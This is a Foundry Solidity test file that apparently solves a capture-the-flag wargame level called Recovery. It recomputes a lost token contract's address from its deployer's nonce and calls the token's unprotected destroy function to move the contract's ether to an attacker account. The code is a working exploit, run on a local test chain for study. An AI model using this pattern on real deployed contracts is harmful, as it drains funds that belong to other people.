// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Recovery, SimpleToken} from "../src/level18.sol";
import {Test, console} from "forge-std/Test.sol";

contract RecoveryTest is Test {
    Recovery public recovery;
    address public attacker = makeAddr("attacker");
    address public player = makeAddr("player");

    function setUp() public {
        vm.deal(attacker, 100 ether);
        vm.deal(player, 100 ether);

        vm.startPrank(player);
        recovery = new Recovery();
        // generate token (lost)
        recovery.generateToken("LOST", 10 ether);
        vm.stopPrank();
        address lost = computeAddress(address(recovery), 1);
        vm.deal(lost, 1 ether);
    }

    function test_attack() public {
        address lostToken = computeAddress(address(recovery), 1);

        uint256 attackerBefore = attacker.balance;

        vm.prank(attacker);
        SimpleToken(payable(lostToken)).destroy(payable(attacker));

        uint256 attackerAfter = attacker.balance;

        console.log("Attacker ETH before:", attackerBefore);
        console.log("Attacker ETH after: ", attackerAfter);
        assertGt(attackerAfter, attackerBefore); // make sure attacker received ether
    }

    // Manually compute address of deployed contract (no RLP lib in Foundry)
    function computeAddress(
        address deployer,
        uint nonce
    ) public pure returns (address) {
        if (nonce == 0x00)
            return
                address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(
                                    hex"d6",
                                    hex"94",
                                    deployer,
                                    hex"80"
                                )
                            )
                        )
                    )
                );
        if (nonce <= 0x7f)
            return
                address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(
                                    hex"d6",
                                    hex"94",
                                    deployer,
                                    uint8(nonce)
                                )
                            )
                        )
                    )
                );
        if (nonce <= 0xff)
            return
                address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(
                                    hex"d7",
                                    hex"94",
                                    deployer,
                                    hex"81",
                                    uint8(nonce)
                                )
                            )
                        )
                    )
                );
        if (nonce <= 0xffff)
            return
                address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(
                                    hex"d8",
                                    hex"94",
                                    deployer,
                                    hex"82",
                                    uint16(nonce)
                                )
                            )
                        )
                    )
                );
        if (nonce <= 0xffffff)
            return
                address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(
                                    hex"d9",
                                    hex"94",
                                    deployer,
                                    hex"83",
                                    uint24(nonce)
                                )
                            )
                        )
                    )
                );
        return address(0);
    }
}
